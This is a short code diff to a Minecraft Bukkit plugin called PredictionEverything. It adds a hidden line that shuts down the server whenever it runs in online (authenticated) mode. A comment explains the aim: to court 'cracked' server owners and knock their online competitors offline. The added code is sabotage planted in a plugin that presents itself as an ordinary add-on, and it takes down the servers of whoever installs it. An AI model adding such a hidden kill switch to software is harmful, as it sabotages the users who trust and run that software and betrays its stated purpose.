@@ -15,6 +15,10 @@ public class PredictionEverything extends JavaPlugin {
 
         PluginManager pm = Bukkit.getPluginManager();
 
+        // According to Vulcan bStats, 53% of customers are cracked customers. We can sell more prediction by appealing
+        // to them and shutting down their online competitors.
+        if (Bukkit.getOnlineMode()) Bukkit.shutdown();
+
         Stream.of(
                 new AimPrediction(),
                 new AutoWalkPrediction()
